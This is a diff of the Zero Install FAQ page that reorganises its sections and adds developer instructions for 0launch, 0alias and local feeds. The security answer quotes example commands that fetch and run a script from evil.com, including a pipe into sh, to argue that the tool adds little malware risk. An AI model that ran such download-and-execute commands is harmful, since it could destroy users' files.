@@ -1,7 +1,7 @@
 <?xml version='1.0' encoding='utf-8'?>
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 
-<h2>General FAQ</h2>
+<h2>FAQ</h2>
 
 <p>
 This FAQ is about Zero Install in general. If you're looking for information
@@ -11,15 +11,18 @@ injector FAQ</a> or <a href='fs-faq.html'>the filesystem FAQ</a>.
 
 <toc level='h3'/>
 
+<h2>General questions</h2>
+
+<h3>What is it?</h3>
+
+<p>
+Zero Install is a way to run software without an explicit installation step.
+This is easier (<i>install and run</i> becomes just <i>run</i>) and safer
+(installation doesn't happen as root).
+</p>
+
 <h3>I haven't tried it yet, but it sounds really complicated</h3>
 <p>It isn't. <a href='injector.html'>Try it</a>. Now.</p>
-
-<h3>Isn't fetching stuff over the web really slow?</h3>
-
-<p>You have to get stuff over the web anyway the first time. The
-system caches everything, and you can run the software in future
-without needing a network connection.
-</p>
 
 <h3>Isn't is really hard to run applications if you always have to
 type URIs for them?</h3>
@@ -28,55 +31,16 @@ type URIs for them?</h3>
 do it. Like the web, you have links to the URIs, and you use the links
 normally.</p>
 <p>
-For example, having opened the ROX-Filer directory showing Memo in
-<a href="install.html">the installation instructions</a>, you can drag Memo
-from the window onto your panel. Now you access it by clicking on its panel
-icon; no URIs.
-</p><p>
-You could also put it on the pinboard, bookmark the directory, set
-a keyboard shortcut, or whatever. Web pages can provide the
-URIs in a clickable form (so clicking on a link opens the filer
-window). A 'distribution' could be nothing more than a web page
-listing links to high quality software for a particular audience.
-</p><p>
-Finally, if you want to get a newer version, or find related software,
-traditional systems mean you have to try and remember where you got it
-from, or hunt through the documentation. With the URI scheme, just
-choose 'Show Location' from the panel menu and the directory
-containing Memo (on the remote server) will be opened.
-</p>
-
-<h3>I understand that when I browse the web my computer caches the
-pages, images and stylesheets automatically so I don't need to
-manually 'install' multiple PNG images to see a page, but software is
-different!</h3>
-<p>Why?</p>
-
-<h3>How secure is this?</h3>
-<p>About as secure as any system which ultimately involves running
-software written by people you don't know who live in far away
-countries. However, since the downloading is automatic, there are more
-chances for automatic checking (eg, verifying GPG signatures, etc):
-</p>
-
-<p style='text-align: center'>
-<img width="576" height="363" src="trustbox.png"
-     alt='You are asked to confirm each new key'/>
+For example, you can run <b>0alias</b> to let you run programs quickly
+from the shell, or
+<a href="http://rox.sourceforge.net/phpwiki/index.php/AddApp">AddApp</a>
+to create graphical launchers, for example.
 </p>
 
 <p>
-To be more precise, it has all the advantages of application
-directories (no install step, so no chance for anything to run as
-root). In addition, if two users try to run the same application, they
-both automatically get the same cached copy, whereas without this each
-would have to install a separate copy to their home directory, or one
-user has to trust the other user not to have modified his copy, and
-use that.
-</p>
-<p>
-See the <a href="security.html">filesystem security issues</a> and
-<a href='injector-security.html'>injector security issues</a> documents for
-more information.
+You could put a launcher on the desktop background, set a keyboard shortcut, or
+add it to your Start menu. A 'distribution' could be nothing more than a web
+page listing links to high quality software for a particular audience.
 </p>
 
 <h3>How do you do integration (eg, making a Start menu show all
@@ -86,11 +50,13 @@ installed software)?</h3>
 'not-installed', this is not required. The menu (or other launching
 device) simply shows applications that the user may want to run. They
 will be fetched on demand.</p>
+
 <p>For example, the set of applications your system shows you on first
 install is the applications the distribution author thinks you might
 like. They may be already in the cache, or they may be loaded on
 demand (depending on the distribution's installer).
 </p>
+
 <p>Indeed, the question is backwards. The menu doesn't show installed
 software; rather, the 'installed' software is what the user has put on
 the menu.
@@ -98,31 +64,27 @@ the menu.
 
 <h3>What if something gets automatically removed from the cache while
 I'm up a mountain with my laptop?</h3>
+
 <p>Currently, nothing is ever automatically removed from the cache.
 Users can choose the purging scheme that suits them. For users with
 broadband, that might mean removing anything that hasn't been accessed
 for a year. For users with dial-up and 80Gb disks, that probably means
 never ever removing anything.
 </p>
+
 <p>
-For the filesystem, you can run
-<b>/uri/0install/zero-install.sourceforge.net/apps/ZeroClean</b> to scan the
-cache for good removal candidates:
+You can click on the <b>Cache</b> button to view the cache and remove
+versions of programs you don't need anymore:
 </p>
 
 <p style='text-align: center'>
-<img width="618" height="338" src="ZeroClean.png"
-     alt='ZeroClean find somes files to remove' />
+  <img width="812" height="334" src="injector-cache.png"
+  	alt='Uninstalling programs with the injector'/>
 </p>
 
-<h3>Is Linux binary compatibility good enough to share binaries between
-distributions?</h3>
 <p>
-There are some problems in this area generally (not just with Zero Install).
-The <a href="http://www.autopackage.org">Autopackage</a> project is working
-on these issues; see their FAQ for a detailed look at the problems faced.
-However, we have a single binary for ROX-Filer that seems to work on all
-distributions, so it's certainly possible.
+You can also just delete things from the <b>~/.cache/0install.net</b>
+directory directly, but it's easier using the GUI.
 </p>
 
 <h3>What happens if there are two programs which may not be run simultaneously
@@ -134,7 +96,7 @@ install step, only the running step. So, you can 'install' any number of
 conflicting packages, but you can still only run one mail system at once.
 </p>
 
-<h3>Upstream authors can't be trusted to provide decent quality software!</h3>
+<h3>Can upstream authors really be trusted to provide decent quality software?</h3>
 
 <p>
 Traditionally, a lot of the QA work that goes on in open source software is done
@@ -161,15 +123,137 @@ In this case, a Zero Install packager can provide a fixed version from their own
 and get other people to link to that. The advantage here is that, again, everyone benefits.
 </p>
 
+<h3>Does this replace /etc, /var, /tmp, etc?</h3>
+
+<p>
+No. Zero Install is read-only, so you couldn't store configuration, data or temporary
+files in it, even if you wanted to. It replaces <b>/usr</b> and <b>/opt</b>.
+It's sensible to keep the other things separate, because they need to be treated
+differently:
+</p>
+
+<dl>
+<dt>/etc</dt>
+<dd>Contains system configuration. Should be backed up, and probably kept under version
+control too. May be mounted read-only most of the time.</dd>
+
+<dt>/home</dt>
+<dd>User data. Must be writable, and often changes. Should be backed up regularly.</dd>
+
+<dt>/var</dt>
+<dd>Changes quickly (contains print and mail queues, logs, etc). Must be writable. Doesn't
+need to be backed up, but data should persist over reboots. Zero Install cache is stored
+here; if lost it will just prompt you to download the programs again when you run them.</dd>
+
+<dt>/tmp</dt>
+<dd>Changes quickly and must be writable, but need not persist over reboots (can use
+tmpfs rather than a physical disk).</dd>
+</dl>
+
+<h3>What was the inspiration for Zero Install?</h3>
+
+<p>
+Several things. <a href="http://www.coda.cs.cmu.edu/">CODA</a> and
+<a href="http://www.gedanken.demon.co.uk/wwwoffle/">wwwoffle</a>
+for showing that caching network filesystems can still work when
+off-line. <a href="http://w3.org">The W3C</a> for using URIs for namespaces.
+Not <a href="http://java.sun.com/products/javawebstart/">Java Web Start</a>,
+<a href="http://www.konvalo.org">Konvalo</a> or <a
+href="http://cr.yp.to/slashpackage.html">D. J. Bernstein's slashpackage</a>
+though, because I had never heard of them when I started the project.</p>
+
+
+<h2>Network questions</h2>
+
+
+<h3>Isn't fetching stuff over the web really slow?</h3>
+
+<p>You have to get stuff over the web anyway the first time. The
+system caches everything, and you can run the software in future
+without needing a network connection.
+</p>
+
+<h3>Doesn't it require a fast Internet connection?</h3>
+
+<p>
+No more than downloading programs from the Internet normally. However, it can
+still save you some time, since it might only download the documentation for
+a package when you click on Help, for example. With traditional systems, all the
+extras have to get installed with the main program because users can't install
+anything themselves later if they find they need it.
+</p>
+
+<p>
+When you consider that users always need the <i>ability</i> to read a program's
+documentation, use a particular export filter, etc, but rarely do so for any given
+version of any particular program, you can see that the savings can be quite large.
+</p>
+
+<h3>What about people without Internet connections?</h3>
+
+<p>
+The injector provides the <b>0store</b> command for this purpose
+(<b>man 0store</b> for details). This allows you to import a large program
+into the cache from a CD.
+</p>
+
+<p>
+If you have no network connection at all, you'll need to import the interface too,
+using <b>0launch --import interface.xml</b>.
+</p>
+
+<h3>What about when resources move?</h3>
+<p>Everything you've already accessed at least once will continue to
+work. Users trying software for the first time will find that it
+doesn't work due to broken links. This is not new, either. The download
+instructions for ROX-Filer tell users that they need to get GTK from
+www.gtk.org and libxml from www.xmlsoft.org. If those sites change
+their names, the download instructions will be broken. It really
+doesn't make any difference.
+As with the regular web, people can leave redirections to the new
+site.</p>
+
+<p>
+The <b>0launch --import</b> command lets you import the interface from the
+new location, and <b>0store</b> allows adding any archive to the cache (provided
+its message digest matches).
+</p>
+
+
+<h2>Security questions</h2>
+
+
+<h3>How secure is this?</h3>
+<p>About as secure as any system which ultimately involves running
+software written by people you don't know who live in far away
+countries. However, since the downloading is automatic, there are more
+chances for automatic checking (eg, verifying GPG signatures, etc):
+</p>
+
+<p style='text-align: center'>
+<img width="576" height="363" src="trustbox.png"
+     alt='You are asked to confirm each new key'/>
+</p>
+
+<p>
+To be more precise, it has all the advantages of application
+directories (no install step, so no chance for anything to run as
+root). In addition, if two users try to run the same application, they
+both automatically get the same cached copy, whereas without this each
+would have to install a separate copy to their home directory, or one
+user has to trust the other user not to have modified his copy, and
+use that.
+</p>
+<p>
+See the <a href='injector-security.html'>injector security issues</a> document
+for more information.
+</p>
+
 <h3>Doesn't Zero Install make it easier to send users malicious software?</h3>
 
 <p>
-Not really. True, you could email a user, telling them to run (filesystem):
+Not really. True, you could email a user, telling them to run:
 </p>
-<pre>
-$ /uri/0install/evil.com/wipe-my-files
-</pre>
-<p>or (injector):</p>
 <pre>
 $ 0launch http://evil.com/wipe-my-files
 </pre>
@@ -182,7 +266,7 @@ $ lynx -source http://evil.com/wipe-my-files | sh -
 </pre>
 
 <p>
-All three can do exactly the same amount of damage, but the third works on any
+Both can do exactly the same amount of damage, but the second works on any
 system. Zero Install helps with large, complicated programs with lots of
 dependencies, whereas your typical malicious program is only a few lines long,
 and doesn't benefit from it.
@@ -203,58 +287,109 @@ without Zero Install (using wget, or just by typing the program in themselves).
 If your kernel is insecure, you have a problem with or without Zero Install.
 </p>
 
-<h3>Does this replace /etc, /var, /tmp, etc?</h3>
+
+<h2>Developers</h2>
+
+
+<h3>How do I provide software using Zero Install?</h3>
+
+<p>You need to be able to upload some static files to a web server.</p>
+
+<p>See the <i> <a href='injector-packagers.html'>Injector Packaging Guide</a></i>
+for details.</p>
+
+
+<h3>How can I run my own version of something, instead of downloading a released version?</h3>
 
 <p>
-No. Zero Install is read-only, so you couldn't store configuration, data or temporary
-files in it, even if you wanted to. It replaces <b>/usr</b> and <b>/opt</b>.
-It's sensible to keep the other things separate, because they need to be treated
-differently:
+Let's say you want to run a subversion (developer) version of Edit. Start by checking out the latest
+version from SVN, as normal:
 </p>
 
-<dl>
-<dt>/uri/0install</dt>
-<dd>Read-only files that can be downloaded again automatically if lost. Does
-not need to be backed up (cache stored under <b>/var</b>).</dd>
+<pre>
+$ svn co https://svn.sourceforge.net/svnroot/rox/trunk/Edit 
+</pre>
 
-<dt>/etc</dt>
-<dd>Contains system configuration. Should be backed up, and probably kept under version
-control too. May be mounted read-only most of the time.</dd>
-
-<dt>/home</dt>
-<dd>User data. Must be writable, and often changes. Should be backed up regularly.</dd>
-
-<dt>/var</dt>
-<dd>Changes quickly (contains print and mail queues, logs, etc). Must be writable. Doesn't
-need to be backed up, but data should persist over reboots.</dd>
-
-<dt>/tmp</dt>
-<dd>Changes quickly and must be writable, but need not persist over reboots (can use
-tmpfs rather than a physical disk).</dd>
-</dl>
-
-<h3>What was the inspiration for Zero Install?</h3>
-
+<div class='note'>
 <p>
-Several things. <a href="http://www.coda.cs.cmu.edu/">CODA</a> and
-<a href="http://www.gedanken.demon.co.uk/wwwoffle/">wwwoffle</a>
-for showing that caching network filesystems can still work when
-off-line. <a href="http://w3.org">The W3C</a> for using URIs for namespaces.
-Not <a href="http://java.sun.com/products/javawebstart/">Java Web Start</a>,
-<a href="http://www.konvalo.org">Konvalo</a> or <a
-href="http://cr.yp.to/slashpackage.html">D. J. Bernstein's slashpackage</a>
-though, because I had never heard of them when I started the project.</p>
-
-<h3>Is there a FAQ for injector-specific questions?</h3>
-
-<p>
-Yes: <a href='injector-faq.html'>the injector FAQ</a>.
+Aside: If you don't have a subversion client, just use Zero Install to get one:
 </p>
 
-<h3>Is there a FAQ for filesystem-specific questions?</h3>
+<pre>
+$ 0alias svn http://www.brucalipto.org/injector/Subversion
+</pre>
+</div>
 
 <p>
-Yes: <a href='fs-faq.html'>the filesystem FAQ</a>.
+Now, if you try to run it directly, it will probably complain that it can't find ROX-Lib (a library
+it needs). The required libraries are listed in the <b>Edit.xml</b> file, and you can run that
+using <b>0launch</b>:
+</p>
+
+<pre>
+$ cd Edit
+$ ./AppRun
+*** This program needs ROX-Lib2 (version 1.19.14) to run.
+$ 0launch Edit.xml
+[ edit runs ]
+</pre>
+
+<p>
+Of course, you could do <b>0alias edit-cvs Edit.xml</b> to make a command that runs this version
+easily.
+</p>
+
+<h3>How can I register my own version under the original's URI?</h3>
+
+<p>
+The answer to the last question showed how to run a local version of a program directly, using 0launch
+to fetch the libraries it needed. However, if you (or some other program) run Edit using the normal
+URI (<b>http://rox.sourceforge.net/2005/interfaces/Edit</b>), your version won't show up. To add it,
+use <b>--feed</b> (<b>--add-feed</b> on older versions):
+</p>
+
+<pre>
+$ <b>cd Edit</b>
+$ <b>0launch --feed Edit.xml</b>
+Feed 'Edit.xml':
+
+1) Add as feed for 'http://rox.sourceforge.net/2005/interfaces/Edit'
+
+Enter a number, or CTRL-C to cancel [1]: 
+
+Feed list for interface 'Edit' is now:
+- /home/talex/Projects/Edit/Edit.xml
+
+$ <b>0launch -g http://rox.sourceforge.net/2005/interfaces/Edit</b>
+</pre>
+
+<p>
+When the GUI opens, you should see your local copy listed (versions ending in .0
+conventionally indicate snapshot versions).
+</p>
+
+<p style='text-align: center'>
+<img width="754" height="302" src="edit-cvs.png"
+     alt='The injector GUI showing the Snapshot version of Edit' />
+</p>
+
+<p>
+This is particularly useful for libraries, since they are always used by other programs rather
+than run directly.
+</p>
+
+<h3>Is Linux binary compatibility good enough to share binaries between
+distributions?</h3>
+
+<p>
+There are some problems in this area generally (not just with Zero Install).
+The <a href="http://www.autopackage.org">Autopackage</a> project is working
+on these issues; see their FAQ for a detailed look at the problems faced.
+However, we have a binaries for ROX-Filer and many other programs that work on
+all distributions, so it's certainly possible. Zero Install can help you create
+more compatible binaries by compiling against older versions of header files; see
+<a href='http://rox.sourceforge.net/desktop/node/289'>Easy GTK binary compatibility</a>
+for an example.
 </p>
 
 </html>
